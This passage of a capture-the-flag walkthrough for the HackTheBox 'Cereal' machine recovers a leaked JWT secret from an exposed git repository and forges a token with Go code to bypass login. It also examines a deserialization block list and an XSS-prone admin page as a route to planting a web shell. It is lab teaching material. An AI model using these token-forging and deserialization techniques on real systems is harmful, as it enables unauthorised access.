<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/hooks/applypatch-msg.sample <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/COMMIT_EDITMSG <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/description <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding refs/
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/ORIG_HEAD <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/config <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/FETCH_HEAD <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/HEAD <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding packs
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding objects
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching objects
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Running git checkout .
</code></pre></div><h4 id="git-history">Git History</h4>
<p>I could see the history of this repository by issuing <code>git log</code>.</p>
<p><img class="img-container" src="imgs/image-20210605121727689.png" alt="image-20210605121727689"  />
</p>
<p>Aside from the author&rsquo;s names, one commit with the message &ldquo;Security fixes&rdquo; caught my attention.</p>
<p>I immediately run <code>git diff 8f2a 7bd9</code> to compare the first commit with the security fixes and that reveals a deleted JWT secret.</p>
<p><img class="img-container" src="imgs/image-20210609090452619.png" alt="image-20210609090452619"  />
</p>
<p>It looks like the security fixes include prevention against deserialization attacks which I&rsquo;ll note that as well as the secret:</p>
<ul>
<li>JWT secret: <code>secretlhfIH&amp;FY*#oysuflkhskjfhefesf</code></li>
</ul>
<h3 id="source-code-analysis-1">Source Code Analysis #1</h3>
<blockquote>
<p>I pointed my sh*tty explanation or at least how I understand it with <code>// &lt;==</code> or  <code># &lt;==</code> in the code snippet. Please, don&rsquo;t bully me for this.</p>
</blockquote>
<h4 id="app-overview">App Overview</h4>
<p>The app consist of ASP.NET (back-end)  and React (front-end).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «source-cereal-git» «10.10.14.3» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> 
$ tree -L <span style="color:#ae81ff">1</span> --dirsfirst
.
├── ClientApp
├── Controllers
├── Migrations
├── Models
├── Pages
├── Properties
├── Services
├── ApplicationOptions.cs
├── appsettings.Development.json
├── appsettings.json
├── CerealContext.cs
├── Cereal.csproj
├── DownloadHelper.cs
├── ExtensionMethods.cs
├── IPAddressHandler.cs
├── IPRequirement.cs
├── Program.cs
└── Startup.cs
</code></pre></div><p>The source code of previously seen React app at <code>cereal.htb</code> is on the ClientApp folder.</p>
<p>Here is the overview of app execution flow:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Program.cs
 |
 v
Startup.cs  -&gt; Loads appsettings.json
 |
 v
React client
</code></pre></div><p>Looking into the <code>appsettings.js</code>, I could obtain the following information:</p>
<ul>
<li>There is IP whitelist</li>
<li>There are two rules that looks like limiting requests and it&rsquo;ll reset after certain period. One of them is limiting a post request to an endpoint called <code>/requests</code>.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
<span style="color:#960050;background-color:#1e0010">...&lt;SNIP&gt;...</span>
  <span style="color:#f92672">&#34;AllowedHosts&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
  <span style="color:#f92672">&#34;ApplicationOptions&#34;</span>: {
    <span style="color:#f92672">&#34;Whitelist&#34;</span>: [ <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::1&#34;</span> ]
  },
  <span style="color:#f92672">&#34;IpRateLimiting&#34;</span>: {
    <span style="color:#f92672">&#34;EnableEndpointRateLimiting&#34;</span>: <span style="color:#66d9ef">true</span>,
    <span style="color:#f92672">&#34;StackBlockedRequests&#34;</span>: <span style="color:#66d9ef">false</span>,
    <span style="color:#f92672">&#34;RealIpHeader&#34;</span>: <span style="color:#e6db74">&#34;X-Real-IP&#34;</span>,
    <span style="color:#f92672">&#34;ClientIdHeader&#34;</span>: <span style="color:#e6db74">&#34;X-ClientId&#34;</span>,
    <span style="color:#f92672">&#34;HttpStatusCode&#34;</span>: <span style="color:#ae81ff">429</span>,
    <span style="color:#f92672">&#34;IpWhitelist&#34;</span>: [ <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::1&#34;</span> ],
    <span style="color:#f92672">&#34;EndpointWhitelist&#34;</span>: [],
    <span style="color:#f92672">&#34;ClientWhitelist&#34;</span>: [],
    <span style="color:#f92672">&#34;GeneralRules&#34;</span>: [
      {
        <span style="color:#f92672">&#34;Endpoint&#34;</span>: <span style="color:#e6db74">&#34;post:/requests&#34;</span>,
        <span style="color:#f92672">&#34;Period&#34;</span>: <span style="color:#e6db74">&#34;5m&#34;</span>,
        <span style="color:#f92672">&#34;Limit&#34;</span>: <span style="color:#ae81ff">2</span>
      },
      {
        <span style="color:#f92672">&#34;Endpoint&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
        <span style="color:#f92672">&#34;Period&#34;</span>: <span style="color:#e6db74">&#34;5m&#34;</span>,
        <span style="color:#f92672">&#34;Limit&#34;</span>: <span style="color:#ae81ff">150</span>
      }
    ]
  }
}

</code></pre></div><h4 id="authentication-vulnerability">Authentication Vulnerability</h4>
<p>Looking into the <code>Startup.cs</code> file, I could see there is a potential authentication bypass. On the following code snippet, the application clearly doesn&rsquo;t validate the issuer and the audience of a JWT token, and <a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">this can raise a security issue</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
    <span style="color:#66d9ef">var</span> key = Encoding.ASCII.GetBytes(<span style="color:#e6db74">&#34;*&#34;</span>);
    services.AddAuthentication(x =&gt;
    {
        x.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme;
        x.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme;
    })
    .AddJwtBearer(x =&gt;
    {
        x.RequireHttpsMetadata = <span style="color:#66d9ef">false</span>;
        x.SaveToken = <span style="color:#66d9ef">true</span>;
        x.TokenValidationParameters = <span style="color:#66d9ef">new</span> TokenValidationParameters
        {
            ValidateIssuerSigningKey = <span style="color:#66d9ef">true</span>,
            IssuerSigningKey = <span style="color:#66d9ef">new</span> SymmetricSecurityKey(key),
            ValidateIssuer = <span style="color:#66d9ef">false</span>, <span style="color:#75715e">// &lt;== No validation
</span><span style="color:#75715e"></span>            ValidateAudience = <span style="color:#66d9ef">false</span> <span style="color:#75715e">// &lt;== No validation
</span><span style="color:#75715e"></span>        };
    });
...&lt;SNIP&gt;...
</code></pre></div><p>The JWT token itself is forged at <code>Services/UserService.cs</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#66d9ef">public</span> User Authenticate(<span style="color:#66d9ef">string</span> username, <span style="color:#66d9ef">string</span> password)
        {
            <span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> db = <span style="color:#66d9ef">new</span> CerealContext())
            {
                <span style="color:#66d9ef">var</span> user = db.Users.Where(x =&gt; x.Username == username &amp;&amp; x.Password == password).SingleOrDefault();

                <span style="color:#75715e">// return null if user not found
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (user == <span style="color:#66d9ef">null</span>)
                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;

                <span style="color:#75715e">// authentication successful so generate jwt token
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">var</span> tokenHandler = <span style="color:#66d9ef">new</span> JwtSecurityTokenHandler();
                <span style="color:#66d9ef">var</span> key = Encoding.ASCII.GetBytes(<span style="color:#e6db74">&#34;*&#34;</span>);
                <span style="color:#66d9ef">var</span> tokenDescriptor = <span style="color:#66d9ef">new</span> SecurityTokenDescriptor
                {
                    Subject = <span style="color:#66d9ef">new</span> ClaimsIdentity(<span style="color:#66d9ef">new</span> Claim[]
                    {
                        <span style="color:#66d9ef">new</span> Claim(ClaimTypes.Name, user.UserId.ToString())
                    }),
                    Expires = DateTime.UtcNow.AddDays(<span style="color:#ae81ff">7</span>),
                    SigningCredentials = <span style="color:#66d9ef">new</span> SigningCredentials(<span style="color:#66d9ef">new</span> SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
                };
                <span style="color:#66d9ef">var</span> token = tokenHandler.CreateToken(tokenDescriptor);
                user.Token = tokenHandler.WriteToken(token);

                <span style="color:#66d9ef">return</span> user.WithoutPassword();
            }
</code></pre></div><p>When the user attempts to authenticate, the code snippet above checks to see if the user&rsquo;s credentials match those in the database. If the credentials match, the app will generate a JWT token for that user.</p>
<p>The user model is defined in here <code>Models/User.cs</code>. From here, I can assume each JWT token contains at least a user&rsquo;s ID, expiration time (7 days), Username, and Token.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>
    {
<span style="color:#a6e22e">        [Key]</span>
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> UserId { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
<span style="color:#a6e22e">        [Required]</span>
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Username { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
<span style="color:#a6e22e">        [Required]</span>
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Password { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Token { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
    }
...&lt;SNIP&gt;...
</code></pre></div><p>Interestingly, in <code>ClientApp/src/LoginPage/LoginPage.jsx</code>, the authentication process doesn&rsquo;t look like it needs server/back-end validation, because it checks the browser&rsquo;s local storage first.</p>
<blockquote>
<p>It&rsquo;ll ask the server if we press the login button (POST request).</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
<span style="color:#66d9ef">import</span> { <span style="color:#a6e22e">authenticationService</span> } <span style="color:#a6e22e">from</span> <span style="color:#e6db74">&#39;../_services&#39;</span>; <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">LoginPage</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">React</span>.<span style="color:#a6e22e">Component</span> {
    <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">props</span>) {
        <span style="color:#66d9ef">super</span>(<span style="color:#a6e22e">props</span>);

        <span style="color:#75715e">// redirect to home if already logged in
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">authenticationService</span>.<span style="color:#a6e22e">currentUserValue</span>) {  <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;/&#39;</span>); 
        }
    }

    <span style="color:#a6e22e">render</span>() {
        <span style="color:#66d9ef">return</span> (
            <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>
                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Login</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/h2&gt;</span>
...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
</code></pre></div><p>I could track the <code>authenticationService.currentUserValue</code> and it is defined in  <code>ClientApp/src/_services/authentication.service.jsx</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">currentUserSubject</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BehaviorSubject</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">getItem</span>(<span style="color:#e6db74">&#39;currentUser&#39;</span>))); <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">export</span> <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">authenticationService</span> <span style="color:#f92672">=</span> {
    <span style="color:#a6e22e">login</span>,
    <span style="color:#a6e22e">logout</span>,
    <span style="color:#a6e22e">currentUser</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">currentUserSubject</span>.<span style="color:#a6e22e">asObservable</span>(),<span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">get</span> <span style="color:#a6e22e">currentUserValue</span> () { <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">currentUserSubject</span>.<span style="color:#a6e22e">value</span> } <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>};
</code></pre></div><h3 id="authentication-bypass">Authentication Bypass</h3>
<p>I could summarize the previous code analysis to these points:</p>
<ul>
<li>As long as the browser&rsquo;s local storage contains a key of <code>currentUser</code> which has JWT token in its value, the client app will logs the user in.</li>
<li>No other validation in JWT token except the user&rsquo;s ID and expires date. (based on <code>Services/UserService.cs</code>)</li>
<li>Based on  <code>Models/User.cs</code>,  <code>Services/UserService.cs</code>, and  <code>ClientApp/src/_services/auth-header.js</code> , the form of <code>currentUser</code> is something like this:
<ul>
<li><code>&quot;currentUser&quot; : &quot;{ &quot;userId&quot;: &quot;0&quot;, &quot;username&quot;: &quot;name&quot;, &quot;token&quot;: &quot;JWT token&quot;}&quot;</code>.</li>
</ul>
</li>
</ul>
<h4 id="tactics">Tactics</h4>
<p>Here is the tactics to bypass the login page:</p>
<ul>
<li>Since there is no validation on the issuer, and I have the JWT secret key, I could forge my own JWT.</li>
<li>I&rsquo;ll put the forged JWT token to browser&rsquo;s local storage of <code>cereal.htb</code> with the key name of <code>currentUser</code>.</li>
<li>Simply refresh the page afterwards and see if it logs me in.</li>
</ul>
<h4 id="forge-jwt">Forge JWT</h4>
<p>To forge our own JWT, you could try <a href="https://github.com/ticarpi/jwt_tool">jwtool</a>, but I tried to forge my own JWT using Golang lol.</p>
<p>Here is the code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>

<span style="color:#f92672">import</span> (
	<span style="color:#e6db74">&#34;encoding/json&#34;</span>
	<span style="color:#e6db74">&#34;fmt&#34;</span>
	<span style="color:#e6db74">&#34;time&#34;</span>

	<span style="color:#e6db74">&#34;github.com/dgrijalva/jwt-go&#34;</span>
)

<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">UserService</span> <span style="color:#66d9ef">interface</span> {
	<span style="color:#a6e22e">CreateToken</span>(<span style="color:#a6e22e">userID</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">string</span>
}

<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">jwtService</span> <span style="color:#66d9ef">struct</span> {
	<span style="color:#a6e22e">secretKey</span> <span style="color:#66d9ef">string</span>
}

<span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">s</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">jwtService</span>) <span style="color:#a6e22e">CreateToken</span>() <span style="color:#66d9ef">string</span> {
	<span style="color:#a6e22e">claims</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">StandardClaims</span>{
		<span style="color:#a6e22e">ExpiresAt</span>: <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">AddDate</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">7</span>).<span style="color:#a6e22e">UTC</span>().<span style="color:#a6e22e">Unix</span>(),
	}

	<span style="color:#a6e22e">token</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">NewWithClaims</span>(<span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">SigningMethodHS256</span>, <span style="color:#a6e22e">claims</span>)
	<span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">SignedString</span>([]byte(<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">secretKey</span>))
	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		panic(<span style="color:#a6e22e">err</span>)
	}
	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">t</span>
}

<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">User</span> <span style="color:#66d9ef">struct</span> {
	<span style="color:#a6e22e">UserId</span>   <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;userId,omitempty&#34;`</span>
	<span style="color:#a6e22e">Username</span> <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;username,omitempty&#34;`</span>
	<span style="color:#a6e22e">Token</span>    <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;token,omitempty&#34;`</span>
}

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	<span style="color:#a6e22e">jwt</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">jwtService</span>{}
	<span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">secretKey</span> = <span style="color:#e6db74">&#34;secretlhfIH&amp;FY*#oysuflkhskjfhefesf&#34;</span>

	<span style="color:#a6e22e">cu</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">User</span>{
		<span style="color:#a6e22e">UserId</span>:   <span style="color:#e6db74">&#34;1&#34;</span>,
		<span style="color:#a6e22e">Username</span>: <span style="color:#e6db74">&#34;iamf&#34;</span>,
		<span style="color:#a6e22e">Token</span>:    <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">CreateToken</span>(),
	}

	<span style="color:#a6e22e">currentUser</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">Marshal</span>(<span style="color:#a6e22e">cu</span>)
	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#a6e22e">currentUser</span>)
}
</code></pre></div><p>A bit messy but that&rsquo;s work.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «cereal» «10.10.14.3»
$ go run main.go
<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;userId&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;iamf&#34;</span>,<span style="color:#e6db74">&#34;token&#34;</span>:<span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjM4MTgwMzh9.XAcgRqhpgyJARsBMEWg1UOlUeRnQU4bvbk1SpAv3vDM&#34;</span><span style="color:#f92672">}</span>
</code></pre></div><h4 id="login">Login</h4>
<p>Refreshing the page after storing the token into the browser&rsquo;s local storage logs me in.</p>
<p><img class="img-container" src="imgs/image-20210609113605143.png" alt="image-20210609113605143"  />
</p>
<h4 id="input-testing">Input testing</h4>
<p>When I submitted a URL which points to my attacking machine, I received a GET request coming from the Title field.</p>
<p><img class="img-container" src="imgs/image-20210605163056142.png" alt="image-20210605163056142"  />
</p>
<p>Here how the request and response looks like.</p>
<p><img class="img-container" src="imgs/image-20210605183457568.png" alt="image-20210605183457568"  />
</p>
<h3 id="source--code-analysis-2">Source  Code Analysis #2</h3>
<p>I decided to mix it with images hehe.</p>
<h4 id="deserialization-vulnerability">Deserialization Vulnerability</h4>
<p>Looking into the request controller,  <code>Controllers/RequestsController.cs</code>, it turns out that each Cereal Request (POST) sent is saved in database without validation on the body request.</p>
<p><img class="img-container" src="imgs/image-20210609115652148.png" alt="image-20210609115652148"  />
</p>
<p>Because the validation only is on the client side, I could send a cereal request in any format. Here is for example of what I mean:</p>
<p><img class="img-container" src="imgs/image-20210609122743196.png" alt="image-20210609122743196"  />
</p>
<p>The cereal database&rsquo;s name can be found inside  <code>CerealContext.cs</code></p>
<p><img class="img-container" src="imgs/image-20210609120019771.png" alt="image-20210609120019771"  />
</p>
<p>Back into the request controller, there is a comment inside the <code>Get</code> function that points out about deserialization (previously seen at comparing the commit logs):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
<span style="color:#a6e22e">        [Authorize(Policy = &#34;RestrictIP&#34;)]</span>
<span style="color:#a6e22e">        [HttpGet(&#34;{id}&#34;)]</span>
        <span style="color:#66d9ef">public</span> IActionResult Get(<span style="color:#66d9ef">int</span> id)
        {
            <span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> db = <span style="color:#66d9ef">new</span> CerealContext())
            {
                <span style="color:#66d9ef">string</span> json = db.Requests.Where(x =&gt; x.RequestId == id).SingleOrDefault().JSON;
                <span style="color:#75715e">// Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (json.ToLower().Contains(<span style="color:#e6db74">&#34;objectdataprovider&#34;</span>) || json.ToLower().Contains(<span style="color:#e6db74">&#34;windowsidentity&#34;</span>) || json.ToLower().Contains(<span style="color:#e6db74">&#34;system&#34;</span>))
                {
                    <span style="color:#66d9ef">return</span> BadRequest(<span style="color:#66d9ef">new</span> { message = <span style="color:#e6db74">&#34;The cereal police have been dispatched.&#34;</span> });
                }
                <span style="color:#66d9ef">var</span> cereal = JsonConvert.DeserializeObject(json, <span style="color:#66d9ef">new</span> JsonSerializerSettings
                {
                    TypeNameHandling = TypeNameHandling.Auto
                });
                <span style="color:#66d9ef">return</span> Ok(cereal.ToString());
            }
        }
</code></pre></div><p>The <code>Get</code> function can only be accessed if the request IP is in the whitelist (defined in <code>appsettings.json</code> ) and it takes one parameter called <code>id</code> (GET <code>/requests/{id}</code>).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#a6e22e">[Authorize(Policy = &#34;RestrictIP&#34;)]</span>
<span style="color:#a6e22e">[HttpGet(&#34;{id}&#34;)]</span>
</code></pre></div><p>This code blocks the gadget classes used for .NET deserialization attack.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;objectdataprovider&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;windowsidentity&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;system&#34;</span><span style="color:#f92672">))</span>
</code></pre></div><p>But, there is a class called <code>DownloadHelper</code> that has a function which can be used to send a download request:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DownloadHelper</span>
    {
        <span style="color:#66d9ef">private</span> String <span style="color:#ae81ff">_</span>URL;
        <span style="color:#66d9ef">private</span> String <span style="color:#ae81ff">_F</span>ilePath;
        <span style="color:#66d9ef">public</span> String URL
...&lt;SNIP&gt;...
        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> Download()
        {
            <span style="color:#66d9ef">using</span> (WebClient wc = <span style="color:#66d9ef">new</span> WebClient())
            {
                <span style="color:#66d9ef">if</span> (!<span style="color:#66d9ef">string</span>.IsNullOrEmpty(<span style="color:#ae81ff">_</span>URL) &amp;&amp; !<span style="color:#66d9ef">string</span>.IsNullOrEmpty(<span style="color:#ae81ff">_F</span>ilePath))
                {
                    wc.DownloadFile(<span style="color:#ae81ff">_</span>URL, ReplaceLastOccurrence(<span style="color:#ae81ff">_F</span>ilePath,<span style="color:#e6db74">&#34;\\&#34;</span>, <span style="color:#e6db74">&#34;\\21098374243-&#34;</span>));
                }
            }
        }
</code></pre></div><p>I could use <code>DownloadHelper</code> class to download a web shell hosted on my machine by sending a serialized form of this class via the Cereal Request.</p>
<p>The problem here I couldn&rsquo;t make a GET request to <code>requests/{id}</code>  because there is an IP restriction policy.</p>
<h4 id="xss-vulnerability">XSS Vulnerability</h4>
<p>When tracking down where the previous GET request coming, I find out that each Cereal Request sent lands on the admin page (<code>AdminPage.jsx</code>).</p>
<p><img class="img-container" src="imgs/image-20210609114906150.png" alt="image-20210609114906150"  />
</p>
<p>And one of the app library that is used in the admin page called <code>react-marked-down</code> has an <a href="https://hackerone.com/reports/344069">XSS vulnerability</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Accordion</span>.<span style="color:#a6e22e">Toggle</span> <span style="color:#a6e22e">as</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">Button</span>} <span style="color:#a6e22e">variant</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;link&#34;</span> <span style="color:#a6e22e">eventKey</span><span style="color:#f92672">=</span>{<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">requestId</span>} <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;expand&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span>{<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">requestId</span>}<span style="color:#f92672">&gt;</span>
    {<span style="color:#a6e22e">requestData</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;string&#39;</span> <span style="color:#f92672">&amp;&amp;</span> 
